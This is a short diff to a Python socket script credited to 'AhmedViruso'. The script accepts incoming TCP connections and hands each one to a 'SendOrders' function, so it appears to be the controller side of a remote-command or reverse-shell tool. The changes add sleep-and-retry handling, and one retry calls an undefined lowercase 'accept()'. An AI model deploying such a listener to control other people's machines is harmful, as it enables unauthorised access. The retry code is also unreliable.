@@ -1,9 +1,9 @@
 # Python 3
 
 try:
-	import socket
+	import socket,time
 except:
-	print(" Error Import Library")
+	print(" Error Import Libraries")
 	exit()
 
 print(" - By AhmedViruso")
@@ -19,6 +19,7 @@ def Create(): # Create Tcp Socket
     except socket.error as failed:
 
         print(" - Error Creating The Socket : " + str(failed))
+        time.sleep(1.5)
         Create()
 
 
@@ -35,14 +36,19 @@ def Bind(): # Bind The Socket
 
     except socket.error as failed:
         print(" - Socket Binding Error : " + str(failed) + "\n" + " - Retrying...")
+        time.sleep(1.5)
         Bind()
 
 
 def Accept(): # Accpet The Connection
 
-    Con,address = S.accept()   
-    print(" - Connection Has Been Established - Ip -> "+address[0]) 
-    SendOrders(Con)
+    try:
+        Con,address = S.accept()
+        print(" - Connection Has Been Established - Ip -> "+address[0])
+        SendOrders(Con)
+    except:
+        time.sleep(1.5)
+        accept()
 
 
 def SendOrders(Con):
